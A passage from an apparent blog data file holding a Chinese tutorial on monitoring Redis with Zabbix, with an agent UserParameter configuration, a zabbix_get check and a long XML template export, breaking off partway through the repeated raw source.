127.0.0.1 -p 10050 -k <span class=\"string\">&quot;system.cpu.load[all,avg15]&quot;</span></span><br><span class=\"line\">0.270000</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<hr>\n<h3 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h3><p>zabbix&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x7528;&#x6765;&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x548C;nginx&#x7B49;&#x3002;<br>&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x7F51;&#x4E0A;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x5230;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x3010;&#x7EC4;&#x6001;&#x3011;-&gt;&#x3010;&#x6A21;&#x677F;&#x3011;-&gt;&#x3010;&#x6C47;&#x5165;&#x3011;&#x5373;&#x53EF;&#x3002;<br>&#x7531;&#x4E8E;&#x6C47;&#x5165;&#x7684;&#x6A21;&#x677F;&#x9ED8;&#x8BA4;&#x4F1A;&#x8986;&#x76D6;&#x539F;&#x6709;&#x914D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x8BB0;&#x5F97;&#x4E8B;&#x5148;&#x70B9;&#x51FB;&#x6A21;&#x677F;&#x5217;&#x8868;&#x5DE6;&#x4E0B;&#x89D2;&#x7684;&#x3010;&#x6C47;&#x51FA;&#x3011;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x6A21;&#x677F;&#x5907;&#x4EFD;&#x3002;</p>\n<p><br></p>"},{"title":"zabbix监控redis","date":"2016-10-02T14:22:00.000Z","toc":false,"_content":"\n### 导入监控模板\n点击【configuration】——>【templates】——>【import】，导入xml监控模板。\n\n### 配置客户端key\n\n在被监控的主机上，新建/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf配置文件，在最后一行加入：\n```bash\nUserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p $1 info|grep $2|cut -d : -f2\n```\n\n重启服务应用最新的配置文件\n```bash\n#注意确认zabbix_agentd.conf文件UnsafeUserParameters=1 \nservice zabbix-agent restart \n```\n\n### 服务端验证\n\n在zabbix服务器上通过zabbix_get程序获取数据，能正常得到数据，证明通信正常。\n```bash\nzabbix_get -s 172.20.0.20 -k redis_stats[6379,total_connections_received]\n2249669\n```\n\n<!-- more -->\n\n### 添加主机关联模板\n\n通过【configuration】——>【hosts】——>【create host】创建新主机，并在templates项中，查找Templates Redis_6379模板，并link该模板。\n\n验证数据使用【monitoring】——>【lastest data】，打开刚刚添加的主机，查看是否有数据。\n\n<br/>\n\n---\n\n### redis监控模板\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<zabbix_export>\n    <version>2.0</version>\n    <date>2014-02-20T12:21:39Z</date>\n    <groups>\n        <group>\n            <name>Templates</name>\n        </group>\n    </groups>\n    <templates>\n        <template>\n            <template>Templates Redis_6379</template>\n            <name>Templates Redis_6379</name>\n            <groups>\n                <group>\n                    <name>Templates</name>\n                </group>\n            </groups>\n            <applications>\n                <application>\n                    <name>Redis_6379</name>\n                </application>\n            </applications>\n            <items>\n                <item>\n                    <name>Blocked clients_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,blocked_clients]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connected clients_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,connected_clients]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connected slave_6380</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,connected_slave]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connection rate_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,total_connections_received]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Evicted_keys_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,evicted_keys]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Expired keys_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,expired_keys]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Last save time_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,last_save_time]</key>\n                    <delay>60</delay>\n                    <history>3</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units>unixtime</units>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>port status_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>net.tcp.listen[6379]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Request rate_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,total_commands_processed]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Role_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,role]</key>\n                    <delay>60</delay>\n                    <history>3</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>1</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Uptime in seconds_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,uptime_in_seconds]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units>uptime</units>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Used memory_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,used_memory:]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Used_memory_rss_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,used_memory_rss]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n            </items>\n            <discovery_rules/>\n            <macros/>\n            <templates/>\n            <screens/>\n        </template>\n    </templates>\n    <triggers>\n        <trigger>\n            <expression>{Templates Redis_6379:net.tcp.listen[6379].count(#3,0,&quot;eq&quot;)}=3</expression>\n            <name>Redis port 6379 is not running</name>\n            <url/>\n            <status>0</status>\n            <priority>4</priority>\n            <description/>\n            <type>0</type>\n            <dependencies/>\n        </trigger>\n    </triggers>\n    <graphs>\n        <graph>\n            <name>Redis key_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,evicted_keys]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,expired_keys]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Last_save_time_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,last_save_time]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Port Connections_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>0</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>EE0000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,blocked_clients]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>BBBB00</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,total_connections_received]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>CC00CC</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,total_commands_processed]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>3</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00CCCC</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,connected_slave]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>4</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>009900</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,connected_clients]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Port status_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>net.tcp.listen[6379]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Uptime_in_seconds_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,uptime_in_seconds]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Used memory_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,used_memory:]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C8C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,used_memory_rss]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n    </graphs>\n</zabbix_export>\n```","source":"_posts/zabbix监控redis.md","raw":"---\ntitle: zabbix监控redis\ntags:\n  - zabbix\n  - redis\ncategories:\n  - 运维部署\ndate: 2016-10-2 22:22:00\ntoc: false\n---\n\n### 导入监控模板\n点击【configuration】——>【templates】——>【import】，导入xml监控模板。\n\n### 配置客户端key\n\n在被监控的主机上，新建/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf配置文件，在最后一行加入：\n```bash\nUserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p $1 info|grep $2|cut -d : -f2\n```\n\n重启服务应用最新的配置文件\n```bash\n#注意确认zabbix_agentd.conf文件UnsafeUserParameters=1 \nservice zabbix-agent restart \n```\n\n### 服务端验证\n\n在zabbix服务器上通过zabbix_get程序获取数据，能正常得到数据，证明通信正常。\n```bash\nzabbix_get -s 172.20.0.20 -k redis_stats[6379,total_connections_received]\n2249669\n```\n\n<!-- more -->\n\n### 添加主机关联模板\n\n通过【configuration】——>【hosts】——>【create host】创建新主机，并在templates项中，查找Templates Redis_6379模板，并link该模板。\n\n验证数据使用【monitoring】——>【lastest data】，打开刚刚添加的主机，查看是否有数据。\n\n<br/>\n\n---\n\n### redis监控模板\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<zabbix_export>\n    <version>2.0</version>\n    <date>2014-02-20T12:21:39Z</date>\n    <groups>\n        <group>\n            <name>Templates</name>\n        </group>\n    </groups>\n    <templates>\n        <template>\n            <template>Templates Redis_6379</template>\n            <name>Templates Redis_6379</name>\n            <groups>\n                <group>\n                    <name>Templates</name>\n                </group>\n            </groups>\n            <applications>\n                <application>\n                    <name>Redis_6379</name>\n                </application>\n            </applications>\n            <items>\n                <item>\n                    <name>Blocked clients_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,blocked_clients]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connected clients_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,connected_clients]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connected slave_6380</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,connected_slave]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Connection rate_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,total_connections_received]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    